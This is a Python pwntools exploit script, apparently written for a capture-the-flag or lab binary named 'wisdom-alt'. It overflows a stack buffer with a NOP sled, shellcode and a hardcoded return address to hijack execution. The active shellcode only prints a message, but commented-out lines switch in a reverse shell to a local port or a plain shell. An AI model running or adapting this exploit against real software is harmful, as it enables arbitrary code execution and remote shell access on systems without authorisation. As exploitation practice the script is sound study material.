#!/usr/bin/env python3
from pwn import *
context.arch='amd64'
context.os='linux'
 
def main():
    filename = "./wisdom-alt"
    r = process([filename])
    stop = input()
    print(r.recv())
    # payload = "A"*200
    #payload = cyclic(length=200, n = 8)
    #s_code = shellcraft.amd64.linux.connect('127.0.0.1', 12345) + shellcraft.amd64.linux.dupsh('rbp')
    s_code = shellcraft.amd64.linux.echo('Hello world!!') + shellcraft.amd64.linux.exit()
    #s_code = shellcraft.sh()
    s_code_asm = asm(s_code)
    print(len(s_code_asm))
    ret_addr = 0x00007fffffffe0f8 - 168 + 120
    addr = p64(ret_addr, endian='little')
    print(addr)
    nop = asm('nop', arch="amd64")
    payload = nop*(168 - len(s_code_asm) - 32) + s_code_asm + nop*32 + addr
    print(len(payload))
    # Add wisdom
    r.sendline(b"2")
    print(r.recv())
    # send payload
    r.sendline(payload)
    print(r.recv())
    r.interactive()
    
    #shellcode_file = "./shellcode_payload"

    #with open(shellcode_file, "wb") as f:
    #    f.write(payload)

if __name__ == "__main__":
    main()
